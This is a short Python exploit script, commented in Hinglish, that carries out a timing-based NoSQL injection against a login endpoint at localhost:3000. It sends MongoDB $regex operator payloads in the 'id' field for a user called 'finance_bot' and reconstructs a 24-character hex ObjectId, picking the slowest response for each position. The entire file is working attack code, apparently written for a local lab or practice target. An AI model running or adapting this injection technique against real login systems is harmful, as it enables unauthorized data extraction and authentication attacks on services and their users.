import requests
import time
import sys

URL = "http://localhost:3000/api/login"
TARGET_USER = "finance_bot"
# MongoDB IDs sirf hex characters use karti hain
CHARSET = "0123456789abcdef" 

print("[*] Starting Visual Timing Attack...\n")

extracted_id = ""

for i in range(24): # We need 24 characters
    print(f"[*] Testing Position {i+1}...")
    
    max_time = 0
    best_char = ""
    
    # Har character ko check karo
    for char in CHARSET:
        payload = {
            "username": TARGET_USER,
            "id": { "$regex": f"^{extracted_id}{char}" },
            "password": "wrongpassword"
        }
        
        start_time = time.time()
        requests.post(URL, json=payload)
        elapsed = time.time() - start_time
        
        # Screen par live print karo
        sys.stdout.write(f"{char}: {elapsed:.3f}s | ")
        sys.stdout.flush()
        
        # Sabse slow response ko save karo
        if elapsed > max_time:
            max_time = elapsed
            best_char = char
            
    extracted_id += best_char
    print(f"\n[+] Winner for pos {i+1} is '{best_char}' (Time: {max_time:.3f}s)\n")
    
    # Agar max time normal time ke barabar hai, toh warning do
    if max_time < 0.03: 
        print("[-] WARNING: Time delay is too small! Regex might be failing completely.")

print(f"[🎉] FINAL EXTRACTED ID: {extracted_id}")
